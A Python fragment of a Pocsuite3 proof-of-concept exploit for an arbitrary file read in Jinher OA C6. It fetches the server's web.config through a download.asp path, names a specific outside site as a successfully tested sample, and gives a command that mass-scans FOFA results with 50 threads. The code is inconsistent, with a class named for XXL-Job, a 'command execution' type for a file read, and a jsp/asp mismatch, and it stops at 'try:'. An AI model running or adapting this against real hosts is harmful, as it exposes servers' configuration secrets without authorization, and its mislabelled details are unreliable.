...
class XXLJOBPOC(POCBase):
    ...
    appName = "金和OA C6 download.jsp文件存在任意文件读取漏洞"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://oa.ytsc.cn:9000"]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ["requests"]  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息
            """  # 漏洞简要描述
    pocDesc = """
    pocsuite -r ./pocs/oa-c6.py   --dork-fofa app=\"Jinher-OA\"  --max-size 500 --save-file ./redis_res.txt --threads 50
            """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        aurl = f"{self.url}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Referer": "http://oa.ytsc.cn:9000/c6/", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        cookies = {"ASPSESSIONIDQSSBQRCD": "OKCJAJACFPHAJLJJLEICLJPN", "ASP.NET_SessionId": "iwjrb5amiunhd4wtehkhfeic","myie": "false", "ASPSESSIONIDSQRCQQCC": "IDHHMOOBFBFNEBCMGKCGEMHM"}
        try:
